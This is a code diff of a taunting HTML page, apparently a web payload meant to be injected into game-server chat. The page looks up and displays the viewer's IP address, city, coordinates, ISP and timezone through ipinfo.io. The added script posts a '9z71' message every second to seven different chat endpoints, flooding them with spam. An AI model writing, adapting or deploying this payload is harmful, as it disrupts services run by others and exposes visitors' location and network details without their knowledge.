@@ -8,7 +8,7 @@
         body {
             margin: 0;
             padding: 0;
-            background: url('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNDhlYzZldGNhMm90ZzJldGphOXJiZHI1N3B6dDN5NWJxeXBpdnR6eCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l0IyeheChYxx2byDu/giphy.gif') no-repeat center center fixed;
+            background: url('https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3cnFsbTI1cjB3Z2E3MWZydzlnencwaTltZ3RwZ2F6YnR1cjU4eXVyMiZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/2BCnh0U8AsvBK/giphy.gif') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
             color: #0000ff;
@@ -45,7 +45,7 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZTM5a3ExaGs4ODlobGh0cm5xd2hjcWEwaHF1c3JkZG5ib3J3cWRpcCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/YQitE4YNQNahy/giphy.gif" alt="Discord Image">
+        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOGRzajFkY2JhNjV2aXF6cTRtcmxjYTI3NGUyYW94NjFzdGdvNmJwMyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/5n067EUZwH8cvtRfGz/giphy.gif" alt="Discord Image">
     </div>
     <audio autoplay loop>
         <source src="https://cdn.discordapp.com/attachments/1427269915055886497/1427276344596893777/123_2.mp3?ex=68ee462e&is=68ecf4ae&hm=68be7b4455f1f3b19d71ba198f27f282113f4eeb3d9d3236ff75a4cbaebf2363&" type="audio/mpeg">
@@ -60,16 +60,38 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
-    <div class="text">الحساني وصل يا سده</div>
+    <div class="text">دادي وصل</div> 
     <div class="text">(9z71) حسابي دس حياكم</div>
+    
     <script>
-         fetch('https://ipinfo.io/json')
+        // Fetch IP info and display it on the page
+        fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
+            const ipInfo = document.getElementById('ip-info');
+            document.getElementById('ip').textContent = data.ip;
+            document.getElementById('city').textContent = data.city;
+            document.getElementById('region').textContent = data.region;
+            document.getElementById('country').textContent = data.country;
+            document.getElementById('loc').textContent = data.loc;
+            document.getElementById('org').textContent = data.org;
+            document.getElementById('timezone').textContent = data.timezone;
         });
+
+        // Message to send to the chat servers
+        const msg = `👑 9z71 & المري 👑`;
+        const body = JSON.stringify({ message: msg });
+
+        // Send message to multiple servers every second
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", { method: "POST", body });
+            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST", body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})});
+            fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+            fetch("https://melix_chat/chatResult", { method: "POST", body });
+            fetch("https://as_chat/chatResult", { method: "POST", body });
+            fetch("https://chat/chatResult", { method: "POST", body });
+            fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+        }, 1000);
     </script>
 </body>
 </html>
